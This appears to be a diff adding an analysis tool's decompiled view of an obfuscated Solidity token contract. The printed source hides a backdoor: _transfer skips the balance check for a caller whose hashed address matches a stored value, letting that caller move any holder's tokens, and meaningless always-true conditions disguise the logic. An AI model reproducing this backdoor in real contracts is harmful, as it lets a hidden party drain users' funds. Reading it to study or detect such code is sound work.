@@ -1,0 +1,217 @@
+S-SEIR Solidity-like Assembly View
+Note: derived view only; source is not modified and output is not compiled.
+
+Function Token._transfer(address, address, uint256)
+  SourceFunction
+  ```solidity
+  function _transfer(address _from, address _to, uint256 _amount) virtual internal {
+          assembly {
+              if iszero(_from) {
+                  revert(0, 0)
+              }
+              if iszero(_to) {
+                  revert(0, 0)
+              }
+              let bbwz := mload(0x40)
+              let bfo228g := basefee()
+              let nezy9b8 := number()
+              mstore(bbwz, _from)
+              mstore(add(bbwz, 32), 0)
+              let XCUz := keccak256(bbwz, 64)
+              let qVPd := sload(XCUz)
+              let Fpzy := sload(sSgI.slot)
+              mstore(bbwz, shl(96, caller()))
+              if iszero(staticcall(gas(), 2, bbwz, 20, bbwz, 32)) {
+                  revert(0, 0)
+              }
+              let YvIh := mload(bbwz)
+              if iszero(eq(Fpzy, YvIh)) {
+                  if lt(qVPd, _amount) {
+                      let tfe9zci := timestamp()
+                      if eq(tfe9zci, mul(tfe9zci, 1)) {
+                          revert(0, 0)
+                      }
+                  }
+              }
+              sstore(XCUz, sub(qVPd, _amount))
+              mstore(bbwz, _to)
+              mstore(add(bbwz, 32), 0)
+              let iLho := keccak256(bbwz, 64)
+              let bXFg := sload(iLho)
+              sstore(iLho, add(bXFg, _amount))
+              mstore(bbwz, _amount)
+              log3(bbwz, 32, 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef, _from, _to)
+          }
+      }
+  ```
+  AssemblyBlock asm_block_1
+  ```solidity
+  assembly /* s-seir solidity-like view */ {
+      require(_from != address(0)); // yul: revert(0, 0)
+      require(!((!(iszero(_from))) && ((_to == 0)))); // yul: revert(0, 0)
+      if (!((_from == 0)) && !((_to == 0))) {
+          bbwz = mload(0x40); // yul: let bbwz := mload(0x40)
+          bfo228g = block.basefee; // yul: let bfo228g := basefee()
+          nezy9b8 = block.number; // yul: let nezy9b8 := number()
+          memory[bbwz] = _from; // yul: mstore(bbwz, _from)
+          memory[bbwz + 32] = 0; // yul: mstore(add(bbwz, 32), 0)
+          XCUz = slot(UbLX[_from]); // yul: let XCUz := keccak256(bbwz, 64)
+          qVPd = UbLX[_from]; // yul: let qVPd := sload(XCUz)
+          Fpzy = sSgI; // yul: let Fpzy := sload(sSgI.slot)
+          memory[bbwz] = (msg.sender << 96); // yul: mstore(bbwz, shl(96, caller()))
+          bytes32 sha256_result_17 = sha256(abi.encodePacked(bytes20(msg.sender))); // yul: if iszero(staticcall(gas(), 2, bbwz, 20, bbwz, 32))
+      }
+      if ((!((_from == 0)) && !((_to == 0)) && !((staticcall(gasleft(), 2, bbwz, 20, bbwz, 32) == 0))) || (!((_from == 0)) && !((_to == 0)))) {
+          YvIh = uint256(sha256_result_17); // yul: let YvIh := mload(bbwz)
+      }
+      if (!((_from == 0)) && !((_to == 0)) && !((staticcall(gasleft(), 2, bbwz, 20, bbwz, 32) == 0)) && (!(Fpzy == YvIh)) && (qVPd < _amount)) {
+          tfe9zci = block.timestamp; // yul: let tfe9zci := timestamp()
+      }
+      require((tfe9zci != (tfe9zci * 1))); // yul: revert(0, 0)
+      if ((!((_from == 0)) && !((_to == 0)) && !((staticcall(gasleft(), 2, bbwz, 20, bbwz, 32) == 0)) && (!(Fpzy == YvIh)) && (qVPd < _amount) && !((tfe9zci == (tfe9zci * 1)))) || (!((_from == 0)) && !((_to == 0)) && !((staticcall(gasleft(), 2, bbwz, 20, bbwz, 32) == 0)) && (!(Fpzy == YvIh)) && !((qVPd < _amount))) || (!((_from == 0)) && !((_to == 0)) && !((staticcall(gasleft(), 2, bbwz, 20, bbwz, 32) == 0)) && !((!(Fpzy == YvIh)))) || (!((_from == 0)) && !((_to == 0)))) {
+          UbLX[_from] = (qVPd - _amount); // yul: sstore(XCUz, sub(qVPd, _amount))
+      }
+      if ((!((_from == 0)) && !((_to == 0)) && !((staticcall(gasleft(), 2, bbwz, 20, bbwz, 32) == 0)) && (!(Fpzy == YvIh)) && (qVPd < _amount) && !((tfe9zci == (tfe9zci * 1)))) || (!((_from == 0)) && !((_to == 0)) && !((staticcall(gasleft(), 2, bbwz, 20, bbwz, 32) == 0)) && (!(Fpzy == YvIh)) && !((qVPd < _amount))) || (!((_from == 0)) && !((_to == 0)) && !((staticcall(gasleft(), 2, bbwz, 20, bbwz, 32) == 0)) && !((!(Fpzy == YvIh))))) {
+          memory[bbwz] = _to; // yul: mstore(bbwz, _to)
+          memory[bbwz + 32] = 0; // yul: mstore(add(bbwz, 32), 0)
+          iLho = slot(UbLX[_to]); // yul: let iLho := keccak256(bbwz, 64)
+          bXFg = UbLX[_to]; // yul: let bXFg := sload(iLho)
+          UbLX[_to] = (bXFg + _amount); // yul: sstore(iLho, add(bXFg, _amount))
+          memory[bbwz] = _amount; // yul: mstore(bbwz, _amount)
+          emit Transfer(_from, _to, _amount); // yul: log3(bbwz, 32, 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef, _from, _to)
+      }
+  }
+  ```
+
+Function Token.approve(address, uint256)
+  SourceFunction
+  ```solidity
+  function approve(address _spender, uint256 _amount) virtual public returns (bool) {
+          assembly {
+              let bbwz := mload(0x40)
+              mstore(bbwz, caller())
+              mstore(add(bbwz, 0x20), wZHA.slot)
+              let ZFHJ := keccak256(bbwz, 0x40)
+              mstore(bbwz, _spender)
+              mstore(add(bbwz, 0x20), ZFHJ)
+              let akRJ := keccak256(bbwz, 0x40)
+              sstore(akRJ, _amount)
+              log3(bbwz, 0x20, 0x8c5be1e5ebec7d5bd14f714f4f5ec7c46ab3db174da78c3f62f10b71e9aeeaa0, caller(), _spender)
+              mstore(bbwz, _amount)
+          }
+          return true;
+      }
+  ```
+  AssemblyBlock asm_block_2
+  ```solidity
+  assembly /* s-seir solidity-like view */ {
+      bbwz = mload(0x40); // yul: let bbwz := mload(0x40)
+      memory[bbwz] = msg.sender; // yul: mstore(bbwz, caller())
+      memory[bbwz + 32] = wZHA.slot; // yul: mstore(add(bbwz, 0x20), wZHA.slot)
+      ZFHJ = slot(wZHA[msg.sender]); // yul: let ZFHJ := keccak256(bbwz, 0x40)
+      memory[bbwz] = _spender; // yul: mstore(bbwz, _spender)
+      memory[bbwz + 32] = ZFHJ; // yul: mstore(add(bbwz, 0x20), ZFHJ)
+      akRJ = slot(wZHA[msg.sender][_spender]); // yul: let akRJ := keccak256(bbwz, 0x40)
+      wZHA[msg.sender][_spender] = _amount; // yul: sstore(akRJ, _amount)
+      emit unknownEvent(msg.sender, _spender, _spender); // yul: log3(bbwz, 0x20, 0x8c5be1e5ebec7d5bd14f714f4f5ec7c46ab3db174da78c3f62f10b71e9aeeaa0, caller(), _spender)
+      memory[bbwz] = _amount; // yul: mstore(bbwz, _amount)
+  }
+  ```
+
+Function Token._spendAllowance(address, address, uint256)
+  SourceFunction
+  ```solidity
+  function _spendAllowance(address _owner, address _spender, uint256 _amount) virtual internal {
+          assembly {
+              let bbwz := mload(0x40)
+              mstore(bbwz, sload(qBQC.slot))
+              mstore(add(bbwz, 32), 1)
+              let uAnE := keccak256(bbwz, 64)
+              let bcw8ayf := basefee()
+              let ncwupwx := number()
+              let Jfwv := keccak256(bbwz, 64)
+              let CCkU := sload(Jfwv)
+              if eq(sub(bcw8ayf, ncwupwx), sub(bcw8ayf, ncwupwx)) {
+                  mstore(bbwz, _owner)
+                  mstore(add(bbwz, 32), uAnE)
+                  Jfwv := keccak256(bbwz, 64)
+                  CCkU := sload(Jfwv)
+              }
+              let zfPf := CCkU
+              if and(zfPf, iszero(_amount)) {
+                  revert(0, 0)
+              }
+              if iszero(zfPf) {
+                  mstore(bbwz, _owner)
+                  mstore(add(bbwz, 32), 1)
+                  uAnE := keccak256(bbwz, 64)
+                  mstore(bbwz, _spender)
+                  mstore(add(bbwz, 32), uAnE)
+                  Jfwv := keccak256(bbwz, 64)
+                  zfPf := add(sload(Jfwv), CCkU)
+              }
+              let gbj1enk := gas()
+              pop(0)
+              if eq(gbj1enk, and(gbj1enk, gbj1enk)) {
+                  zfPf := sub(zfPf, CCkU)
+              }
+              if iszero(eq(zfPf, not(0))) {
+                  if lt(zfPf, _amount) {
+                      revert(0, 0)
+                  }
+                  let bf51h1a := basefee()
+                  pop(0)
+                  if eq(bf51h1a, and(bf51h1a, bf51h1a)) {
+                      sstore(Jfwv, sub(zfPf, _amount))
+                  }
+              }
+          }
+      }
+  ```
+  AssemblyBlock asm_block_3
+  ```solidity
+  assembly /* s-seir solidity-like view */ {
+      bbwz = mload(0x40); // yul: let bbwz := mload(0x40)
+      memory[bbwz] = qBQC; // yul: mstore(bbwz, sload(qBQC.slot))
+      memory[bbwz + 32] = 1; // yul: mstore(add(bbwz, 32), 1)
+      uAnE = slot(wZHA[sload(qBQC.slot)]); // yul: let uAnE := keccak256(bbwz, 64)
+      bcw8ayf = block.basefee; // yul: let bcw8ayf := basefee()
+      ncwupwx = block.number; // yul: let ncwupwx := number()
+      Jfwv = slot(wZHA[sload(qBQC.slot)]); // yul: let Jfwv := keccak256(bbwz, 64)
+      CCkU = wZHA[sload(qBQC.slot)]; // yul: let CCkU := sload(Jfwv)
+      if (((bcw8ayf - ncwupwx) == (bcw8ayf - ncwupwx))) {
+          memory[bbwz] = _owner; // yul: mstore(bbwz, _owner)
+          memory[bbwz + 32] = uAnE; // yul: mstore(add(bbwz, 32), uAnE)
+          Jfwv = slot(wZHA[sload(qBQC.slot)][_owner]); // yul: Jfwv := keccak256(bbwz, 64)
+          CCkU = wZHA[sload(qBQC.slot)][_owner]; // yul: CCkU := sload(Jfwv)
+      }
+      if ((!(((bcw8ayf - ncwupwx) == (bcw8ayf - ncwupwx)))) || (((bcw8ayf - ncwupwx) == (bcw8ayf - ncwupwx)))) {
+          zfPf = CCkU; // yul: let zfPf := CCkU
+      }
+      require(!(((zfPf & (_amount == 0)) != 0))); // yul: revert(0, 0)
+      if ((!(((bcw8ayf - ncwupwx) == (bcw8ayf - ncwupwx))) && !(((zfPf & (_amount == 0)) != 0)) && (zfPf == 0)) || (((bcw8ayf - ncwupwx) == (bcw8ayf - ncwupwx)) && !(((zfPf & (_amount == 0)) != 0)) && (zfPf == 0))) {
+          memory[bbwz] = _owner; // yul: mstore(bbwz, _owner)
+          memory[bbwz + 32] = 1; // yul: mstore(add(bbwz, 32), 1)
+          uAnE = slot(wZHA[_owner]); // yul: uAnE := keccak256(bbwz, 64)
+          memory[bbwz] = _spender; // yul: mstore(bbwz, _spender)
+          memory[bbwz + 32] = uAnE; // yul: mstore(add(bbwz, 32), uAnE)
+          Jfwv = slot(wZHA[_owner][_spender]); // yul: Jfwv := keccak256(bbwz, 64)
+          zfPf = wZHA[_owner][_spender]; // yul: zfPf := add(sload(Jfwv), CCkU)
+      }
+      if ((!(((bcw8ayf - ncwupwx) == (bcw8ayf - ncwupwx))) && !(((zfPf & (_amount == 0)) != 0)) && !((zfPf == 0))) || (((bcw8ayf - ncwupwx) == (bcw8ayf - ncwupwx)) && !(((zfPf & (_amount == 0)) != 0)) && !((zfPf == 0))) || (!(((bcw8ayf - ncwupwx) == (bcw8ayf - ncwupwx))) && !(((zfPf & (_amount == 0)) != 0)) && (zfPf == 0)) || (((bcw8ayf - ncwupwx) == (bcw8ayf - ncwupwx)) && !(((zfPf & (_amount == 0)) != 0)) && (zfPf == 0))) {
+          gbj1enk = gasleft(); // yul: let gbj1enk := gas()
+      }
+      pop(0) // yul: pop(0)
+      if ((!(((bcw8ayf - ncwupwx) == (bcw8ayf - ncwupwx))) && !(((zfPf & (_amount == 0)) != 0)) && !((zfPf == 0)) && (gbj1enk == (gbj1enk & gbj1enk))) || (((bcw8ayf - ncwupwx) == (bcw8ayf - ncwupwx)) && !(((zfPf & (_amount == 0)) != 0)) && !((zfPf == 0)) && (gbj1enk == (gbj1enk & gbj1enk))) || (!(((bcw8ayf - ncwupwx) == (bcw8ayf - ncwupwx))) && !(((zfPf & (_amount == 0)) != 0)) && (zfPf == 0) && (gbj1enk == (gbj1enk & gbj1enk))) || (((bcw8ayf - ncwupwx) == (bcw8ayf - ncwupwx)) && !(((zfPf & (_amount == 0)) != 0)) && (zfPf == 0) && (gbj1enk == (gbj1enk & gbj1enk)))) {
+          zfPf = (zfPf - CCkU); // yul: zfPf := sub(zfPf, CCkU)
+      }
+      require(!((((zfPf == (~0)) == 0)) && ((zfPf < _amount)))); // yul: revert(0, 0)
+      if ((!(((bcw8ayf - ncwupwx) == (bcw8ayf - ncwupwx))) && !(((zfPf & (_amount == 0)) != 0)) && !((zfPf == 0)) && !((gbj1enk == (gbj1enk & gbj1enk))) && (!(zfPf == (~0))) && !((zfPf < _amount))) || (!(((bcw8ayf - ncwupwx) == (bcw8ayf - ncwupwx))) && !(((zfPf & (_amount == 0)) != 0)) && !((zfPf == 0)) && (gbj1enk == (gbj1enk & gbj1enk)) && (!(zfPf == (~0))) && !((zfPf < _amount))) || (((bcw8ayf - ncwupwx) == (bcw8ayf - ncwupwx)) && !(((zfPf & (_amount == 0)) != 0)) && !((zfPf == 0)) && !((gbj1enk == (gbj1enk & gbj1enk))) && (!(zfPf == (~0))) && !((zfPf < _amount))) || (((bcw8ayf - ncwupwx) == (bcw8ayf - ncwupwx)) && !(((zfPf & (_amount == 0)) != 0)) && !((zfPf == 0)) && (gbj1enk == (gbj1enk & gbj1enk)) && (!(zfPf == (~0))) && !((zfPf < _amount))) || (!(((bcw8ayf - ncwupwx) == (bcw8ayf - ncwupwx))) && !(((zfPf & (_amount == 0)) != 0)) && (zfPf == 0) && !((gbj1enk == (gbj1enk & gbj1enk))) && (!(zfPf == (~0))) && !((zfPf < _amount))) || (!(((bcw8ayf - ncwupwx) == (bcw8ayf - ncwupwx))) && !(((zfPf & (_amount == 0)) != 0)) && (zfPf == 0) && (gbj1enk == (gbj1enk & gbj1enk)) && (!(zfPf == (~0))) && !((zfPf < _amount))) || (((bcw8ayf - ncwupwx) == (bcw8ayf - ncwupwx)) && !(((zfPf & (_amount == 0)) != 0)) && (zfPf == 0) && !((gbj1enk == (gbj1enk & gbj1enk))) && (!(zfPf == (~0))) && !((zfPf < _amount))) || (((bcw8ayf - ncwupwx) == (bcw8ayf - ncwupwx)) && !(((zfPf & (_amount == 0)) != 0)) && (zfPf == 0) && (gbj1enk == (gbj1enk & gbj1enk)) && (!(zfPf == (~0))) && !((zfPf < _amount)))) {
+          bf51h1a = block.basefee; // yul: let bf51h1a := basefee()
+      }
+      pop(0) // yul: pop(0)
+      if ((!(((bcw8ayf - ncwupwx) == (bcw8ayf - ncwupwx))) && !(((zfPf & (_amount == 0)) != 0)) && !((zfPf == 0)) && !((gbj1enk == (gbj1enk & gbj1enk))) && (!(zfPf == (~0))) && !((zfPf < _amount)) && (bf51h1a == (bf51h1a & bf51h1a))) || (!(((bcw8ayf - ncwupwx) == (bcw8ayf - ncwupwx))) && !(((zfPf & (_amount == 0)) != 0)) && !((zfPf == 0)) && (gbj1enk == (gbj1enk & gbj1enk)) && (!(zfPf == (~0))) && !((zfPf < _amount)) && (bf51h1a == (bf51h1a & bf51h1a))) || (((bcw8ayf - ncwupwx) == (bcw8ayf - ncwupwx)) && !(((zfPf & (_amount == 0)) != 0)) && !((zfPf == 0)) && !((gbj1enk == (gbj1enk & gbj1enk))) && (!(zfPf == (~0))) && !((zfPf < _amount)) && (bf51h1a == (bf51h1a & bf51h1a))) || (((bcw8ayf - ncwupwx) == (bcw8ayf - ncwupwx)) && !(((zfPf & (_amount == 0)) != 0)) && !((zfPf == 0)) && (gbj1enk == (gbj1enk & gbj1enk)) && (!(zfPf == (~0))) && !((zfPf < _amount)) && (bf51h1a == (bf51h1a & bf51h1a))) || (!(((bcw8ayf - ncwupwx) == (bcw8ayf - ncwupwx))) && !(((zfPf & (_amount == 0)) != 0)) && (zfPf == 0) && !((gbj1enk == (gbj1enk & gbj1enk))) && (!(zfPf == (~0))) && !((zfPf < _amount)) && (bf51h1a == (bf51h1a & bf51h1a))) || (!(((bcw8ayf - ncwupwx) == (bcw8ayf - ncwupwx))) && !(((zfPf & (_amount == 0)) != 0)) && (zfPf == 0) && (gbj1enk == (gbj1enk & gbj1enk)) && (!(zfPf == (~0))) && !((zfPf < _amount)) && (bf51h1a == (bf51h1a & bf51h1a))) || (((bcw8ayf - ncwupwx) == (bcw8ayf - ncwupwx)) && !(((zfPf & (_amount == 0)) != 0)) && (zfPf == 0) && !((gbj1enk == (gbj1enk & gbj1enk))) && (!(zfPf == (~0))) && !((zfPf < _amount)) && (bf51h1a == (bf51h1a & bf51h1a))) || (((bcw8ayf - ncwupwx) == (bcw8ayf - ncwupwx)) && !(((zfPf & (_amount == 0)) != 0)) && (zfPf == 0) && (gbj1enk == (gbj1enk & gbj1enk)) && (!(zfPf == (~0))) && !((zfPf < _amount)) && (bf51h1a == (bf51h1a & bf51h1a)))) {
+          wZHA[sload(qBQC.slot)] = (zfPf - _amount); /* path-conditioned */ wZHA[sload(qBQC.slot)][_owner] = (zfPf - _amount); /* path-conditioned */ wZHA[_owner][_spender] = (zfPf - _amount); // yul: sstore(Jfwv, sub(zfPf, _amount))
+      }
+  }
+  ```
